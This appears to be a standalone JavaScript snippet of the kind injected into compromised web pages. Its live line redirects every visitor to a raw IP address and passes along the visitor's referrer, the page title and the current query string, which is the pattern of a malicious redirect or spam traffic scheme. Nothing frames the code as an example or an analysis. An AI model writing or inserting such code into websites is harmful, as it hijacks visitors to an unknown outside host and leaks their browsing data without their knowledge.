//document.location.href = '';


document.location.href = 'http://185.179.190.140/SNV5mX?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script';